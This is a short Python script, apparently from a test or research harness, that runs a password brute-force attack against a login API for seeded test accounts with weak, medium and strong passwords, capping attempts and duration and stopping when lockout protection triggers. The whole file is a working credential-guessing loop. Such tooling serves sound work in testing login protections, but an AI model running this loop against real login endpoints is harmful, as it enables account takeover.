from file_managers.file_manager import FileManager
from loggers.logger import logger
from client import ApiClientService
from context import ctx
import time

USER_NAME_WEAK_PASSWORD_9 = "weak_password_user_9"
USER_NAME_WEAK_PASSWORD_2 = "weak_password_user_2"
USER_NAME_WEAK_PASSWORD_4 = "weak_password_user_4"
USER_NAME_MEDIUM_PASSWORD_2 = "medium_password_user_2"
USER_NAME_STRONG_PASSWORD_1 = "strong_password_user_1"

def brute_force_attack(username: str, file_manager: FileManager):
    """
    Brute force attack
    :return:
    """
    logger.info("Initializing brute force attack")
    passwords = file_manager.get_brute_force_passwords
    client_service = ApiClientService(seed_group=ctx.settings.seed_group)
    protection_flag_fail_attempt = 0
    counter = 0
    MAX_ATTEMPTS = 50_000
    MAX_DURATION_SECONDS = 2 * 60 * 60  # 2 hours
    start_time = time.monotonic()
    for password in passwords:
        if time.monotonic() - start_time >= MAX_DURATION_SECONDS:
            logger.info("Stopping brute force: time limit reached")
            break
        if counter >= MAX_ATTEMPTS:
            logger.info("Stopping brute force: attempt limit reached")
            break
        response = client_service.login(username=username, password=password)
        counter+=1
        if response["status_code"] == 200:
            break
        if response["status_code"] != 200 and response["content"]["detail"] != "Invalid credentials":
            protection_flag_fail_attempt += 1
        if protection_flag_fail_attempt > 100:
            break # if user is blocked by protection flag stop the attack

if __name__ == "__main__":
    brute_force_attack(USER_NAME_WEAK_PASSWORD_9, FileManager())


